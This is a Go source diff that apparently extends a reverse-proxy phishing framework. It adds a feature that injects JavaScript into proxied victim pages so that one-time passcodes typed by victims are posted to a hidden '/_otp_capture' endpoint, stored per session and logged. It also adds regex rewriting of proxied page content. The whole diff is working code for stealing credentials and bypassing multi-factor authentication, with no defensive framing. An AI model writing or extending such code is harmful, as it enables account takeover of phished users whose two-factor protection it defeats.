@@ -202,6 +202,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			otpCfg := p.cfg.GetOtpCaptureConfig()
+			if otpCfg != nil && otpCfg.Enabled {
+				otpPath := otpCfg.EndpointPath
+				if otpPath == "" {
+					otpPath = "/_otp_capture"
+				}
+				if req.Method == "POST" && req.URL.Path == otpPath {
+					return p.handleOtpCapture(req)
+				}
+			}
+
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
@@ -420,6 +431,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									session.RemoteAddr = remote_addr
 									session.UserAgent = req.Header.Get("User-Agent")
+									baseDomain := p.cfg.GetBaseDomainForHost(o_host)
+									if baseDomain != "" {
+										session.SetBaseDomain(baseDomain)
+										if err := p.db.SetSessionBaseDomain(session.Id, baseDomain); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
 									session.RedirectURL = pl.RedirectUrl
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
@@ -1185,7 +1203,36 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
 						}
+
+						otpCfg := p.cfg.GetOtpCaptureConfig()
+						if otpCfg != nil && otpCfg.Enabled {
+							otpPath := otpCfg.EndpointPath
+							if otpPath == "" {
+								otpPath = "/_otp_capture"
+							}
+							dataAttr := otpCfg.DataAttr
+							if dataAttr == "" {
+								dataAttr = "data-otp-input"
+							}
+							fieldNamesJs := ""
+							for i, fn := range otpCfg.FieldNames {
+								if i > 0 {
+									fieldNamesJs += ","
+								}
+								fieldNamesJs += "'" + strings.ReplaceAll(fn, "'", "\\'") + "'"
+							}
+							otpJs := strings.ReplaceAll(OTP_CAPTURE_JS, "{endpoint}", otpPath)
+							otpJs = strings.ReplaceAll(otpJs, "{session_id}", s.Id)
+							otpJs = strings.ReplaceAll(otpJs, "{data_attr}", dataAttr)
+							otpJs = strings.ReplaceAll(otpJs, "[{field_names}]", fieldNamesJs)
+							body = p.injectJavascriptIntoBody(body, otpJs, "")
+						}
 					}
+				}
+
+				rules := p.cfg.GetReplaceRulesForHost(req_hostname)
+				if len(rules) > 0 {
+					body = []byte(p.applyReplaceRules(string(body), rules))
 				}
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1989,6 +2036,64 @@ func getContentType(path string, data []byte) string {
 		return "image/svg+xml"
 	}
 	return http.DetectContentType(data)
+}
+
+type OtpCaptureRequest struct {
+	SessionId string `json:"session_id"`
+	OtpCode   string `json:"otp_code"`
+	FieldName string `json:"field_name"`
+}
+
+func (p *HttpProxy) handleOtpCapture(req *http.Request) (*http.Request, *http.Response) {
+	body, err := ioutil.ReadAll(req.Body)
+	if err != nil {
+		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"bad request"}`)
+		return req, resp
+	}
+	req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+
+	var otpReq OtpCaptureRequest
+	if err := json.Unmarshal(body, &otpReq); err != nil {
+		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"invalid json"}`)
+		return req, resp
+	}
+
+	if otpReq.SessionId == "" || otpReq.OtpCode == "" {
+		resp := goproxy.NewResponse(req, "application/json", 400, `{"status":"error","message":"missing fields"}`)
+		return req, resp
+	}
+
+	s, ok := p.sessions[otpReq.SessionId]
+	if !ok {
+		resp := goproxy.NewResponse(req, "application/json", 404, `{"status":"error","message":"session not found"}`)
+		return req, resp
+	}
+
+	s.AddOtpCode(otpReq.OtpCode, otpReq.FieldName)
+	if err := p.db.SetSessionOtpCodes(s.Id, s.OtpCodes, s.OtpFieldName); err != nil {
+		log.Error("database: %v", err)
+	}
+	log.Success("[%d] captured OTP code: '%s' (field: %s)", p.sids[s.Id], otpReq.OtpCode, otpReq.FieldName)
+
+	resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"ok"}`)
+	return req, resp
+}
+
+func (p *HttpProxy) applyReplaceRules(body string, rules []ReplaceRule) string {
+	result := body
+	for _, rule := range rules {
+		if rule.Type == "regex" {
+			re, err := regexp.Compile(rule.Pattern)
+			if err != nil {
+				log.Warning("replace_rule: invalid regex pattern '%s': %v", rule.Pattern, err)
+				continue
+			}
+			result = re.ReplaceAllString(result, rule.Replace)
+		} else {
+			result = strings.ReplaceAll(result, rule.Pattern, rule.Replace)
+		}
+	}
+	return result
 }
 
 func getSessionCookieName(pl_name string, cookie_name string) string {
